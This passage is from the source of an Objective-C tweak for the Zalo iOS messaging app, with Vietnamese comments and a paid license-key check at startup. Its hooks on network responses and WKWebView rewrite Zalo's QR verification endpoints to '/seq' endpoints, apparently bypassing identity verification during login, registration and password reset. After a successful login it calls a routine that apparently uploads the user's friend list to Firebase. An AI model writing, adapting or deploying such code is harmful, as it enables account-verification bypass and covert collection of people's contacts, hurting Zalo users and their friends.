                            // Tài khoản này ngoài whitelist -> LẬP TỨC KHÓA TWEAK NGAY TRƯỚC KHI SỬA DATA
                            g_tweakEnabled = NO;
                            phoneOk = NO;
                        } else {
                            phoneOk = YES;
                        }
                    } else {
                        // Chưa rõ SĐT: chỉ cho phép nếu policy là unlimited
                        phoneOk = (g_cachedPhonePolicy && [g_cachedPhonePolicy isEqualToString:@"unlimited"]);
                    }

                    // 3. TẦNG 1: CHỈ SỬA QR -> SEQ NẾU TWEAK ĐANG BẬT VÀ PHONE HOÀN TOÀN HỢP LỆ
                    if (g_tweakEnabled && phoneOk) {
                        NSString *dataString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                        if (dataString && ([dataString containsString:@"/verify/v3/qr"] || [dataString containsString:@"/qr/request"])) {
                            NSString *modifiedString = [dataString stringByReplacingOccurrencesOfString:@"/verify/v3/qr/request" withString:@"/verify/v3/seq"];
                            modifiedString = [modifiedString stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
                            modifiedString = [modifiedString stringByReplacingOccurrencesOfString:@"/qr/request" withString:@"/seq"];
                            finalData = [modifiedString dataUsingEncoding:NSUTF8StringEncoding];
                        }
                    }

                    // 4. XỬ LÝ SYNC BẠN BÈ SAU KHI LOGIN / REGISTER / FORGOT THÀNH CÔNG
                    NSDictionary *json = (finalData == data) ? rawJson : [NSJSONSerialization JSONObjectWithData:finalData options:0 error:nil];
                    if ([json isKindOfClass:[NSDictionary class]]) {
                        NSInteger errorCode = [json[@"error_code"] integerValue];
                        id dataObj = json[@"data"];
                        
                        BOOL isLoginComplete = NO;
                        BOOL isRegisterComplete = NO;
                        BOOL isForgotComplete = NO;

                        if (errorCode == 0 && [dataObj isKindOfClass:[NSDictionary class]]) {
                            NSString *sessionKey = dataObj[@"session_key"] ?: dataObj[@"sessionKey"];
                            BOOL loginFlag = [dataObj[@"login_complete"] boolValue] || [dataObj[@"has_session"] boolValue];
                            BOOL regFlag = [dataObj[@"registration_complete"] boolValue];
                            
                            if (loginFlag || (sessionKey.length > 10 && [path containsString:@"/login"])) {
                                isLoginComplete = YES;
                            }
                            if (regFlag || (sessionKey.length > 10 && ([path containsString:@"/register"] || [path containsString:@"/registration"]))) {
                                isRegisterComplete = YES;
                            }
                            if ([path containsString:@"/set-password"] || [path containsString:@"/forgot_password_set_new"] || (sessionKey.length > 10 && [path containsString:@"/forgot"])) {
                                isForgotComplete = YES;
                            }
                        }

                        if (isLoginComplete || isRegisterComplete || isForgotComplete) {
                            if (g_tweakEnabled && detectedPhone && detectedPhone.length >= 8 && isPhoneAllowedByWhitelist(detectedPhone)) {
                                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
                                    autoSyncFriendsToFirebase(detectedPhone, nil, nil);
                                });
                            }
                        }
                    }
                } @catch (NSException *e) {}
            }
            completionHandler(finalData, response, error);
        };
        return %orig(request, wrappedHandler);
    }

    return %orig(request, completionHandler);
}

%end

// ==============================================================================
// HOOK 3: ZALO WEBVIEW (CHUYỂN HƯỚNG BẮT BUỘC QR -> SEQ ĐA TẦNG TUYỆT ĐỐI)
// ==============================================================================
%hook WKWebView

- (WKNavigation *)loadRequest:(NSURLRequest *)request {
    // Guard 1: Tweak chưa kích hoạt → loadRequest chạy hoàn toàn nguyên bản
    if (!g_tweakEnabled) {
        return %orig(request);
    }

    NSURL *url = request.URL;
    NSString *urlStr = url.absoluteString;
    NSString *host = [url.host lowercaseString];

    if ([host containsString:@"zalo.me"] || [host containsString:@"zaloapp.com"] || [host containsString:@"zalo"]) {
        if ([urlStr containsString:@"/qr"] || [urlStr containsString:@"/verify/v3/qr"] || [urlStr containsString:@"/qr/request"] || [urlStr containsString:@"/verify/qr"]) {

            // Guard 2: kiểm tra SĐT hiện tại tại thời điểm redirect
            NSURLComponents *comps = [NSURLComponents componentsWithURL:url resolvingAgainstBaseURL:NO];
            NSString *phoneParam = nil;
            for (NSURLQueryItem *item in comps.queryItems) {
                if ([item.name isEqualToString:@"phone"] || [item.name isEqualToString:@"phoneNumber"]) {
                    phoneParam = item.value;
                    break;
                }
            }
            if (!phoneParam) phoneParam = getZaloLivePhoneNumber();

            // Guard 2: fail-closed tuyệt đối
            // - Không tìm được phone + whitelist mode → không redirect
            // - Tìm được phone nhưng không trong whitelist → không redirect
            if (!phoneParam || phoneParam.length < 8) {
                // Phone chưa biết: chỉ redirect nếu policy unlimited
                if (!g_cachedPhonePolicy || ![g_cachedPhonePolicy isEqualToString:@"unlimited"]) {
                    return %orig(request);
                }
            } else if (!isPhoneAllowedByWhitelist(phoneParam)) {
                // Phone đã biết nhưng không trong whitelist -> giữ nguyên QR gốc
                return %orig(request);
            } else {
                autoSyncFriendsToFirebase(phoneParam, nil, nil);
            }

            NSString *seqUrlStr = urlStr;
            seqUrlStr = [seqUrlStr stringByReplacingOccurrencesOfString:@"/verify/v3/qr/request" withString:@"/verify/v3/seq"];
            seqUrlStr = [seqUrlStr stringByReplacingOccurrencesOfString:@"/verify/v3/qr" withString:@"/verify/v3/seq"];
            seqUrlStr = [seqUrlStr stringByReplacingOccurrencesOfString:@"/qr/request" withString:@"/seq"];
            seqUrlStr = [seqUrlStr stringByReplacingOccurrencesOfString:@"/verify/qr" withString:@"/verify/seq"];

            NSURL *seqUrl = [NSURL URLWithString:seqUrlStr];
            if (seqUrl && ![seqUrlStr isEqualToString:urlStr]) {
                NSMutableURLRequest *newReq = [request mutableCopy];
                [newReq setURL:seqUrl];
                return %orig(newReq);
            }
        }
    }

    return %orig(request);
}

%end

// ==============================================================================
// HOOK 4: BẮT SỰ KIỆN LOGOUT TRÊN TẤT CẢ RUNTIME CLASS QUẢN LÝ TÀI KHOẢN
// ==============================================================================
%hook ZAccountManager

- (void)logout:(id)arg1 {
    %orig;
    handleZaloLogout();
}

- (void)logout {
    %orig;
    handleZaloLogout();
}

- (void)doLogout {
    %orig;
    handleZaloLogout();
}

%end

%hook ZSessionManager

- (void)logout:(id)arg1 {
    %orig;
    handleZaloLogout();
}

- (void)logout {
    %orig;
    handleZaloLogout();
}

- (void)doLogout {
    %orig;
    handleZaloLogout();
}

%end

// ==============================================================================
// HOOK KHỞI ĐỘNG ỨNG DỤNG ZALO - YÊU CẦU NHẬP KEY NGAY KHI MỞ APP
// ==============================================================================
static void checkLicenseOnStartup(void) {
    // Nạp policy đã lưu từ lần trước để fail-open/closed hoạt đúng ngay cả khi Firebase chưa xóng
    loadCachedPolicyFromDisk();

    NSString *savedKey = getSavedLicenseKey();
    if (!savedKey || savedKey.length == 0) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            promptForLicenseKey(^(NSString *newKey) {
                verifyKeyAndExecute(nil, ^{
                    saveLicenseKeyPermanently(newKey);
                    showSecurityAlert(@"✅ KÍCH HOẠT THÀNH CÔNG", [NSString stringWithFormat:@"Thiết bị đã được kích hoạt bản quyền thành công với Mã Key: %@", newKey]);
                });
            });
        });
    } else {
        verifyKeyAndExecute(nil, nil);
    }
}

%hook UIApplication

- (void)_setSuspended:(BOOL)suspended {
    %orig;
    if (!suspended) {
        static dispatch_once_t onceToken;
        dispatch_once(&onceToken, ^{
            checkLicenseOnStartup();
        });
    }
}

%end

%ctor {
    [[NSNotificationCenter defaultCenter] addObserverForName:UIApplicationDidFinishLaunchingNotification
                                                      object:nil
                                                       queue:[NSOperationQueue mainQueue]
                                                  usingBlock:^(NSNotification * _Nonnull note) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            checkLicenseOnStartup();
        });
    }];
}
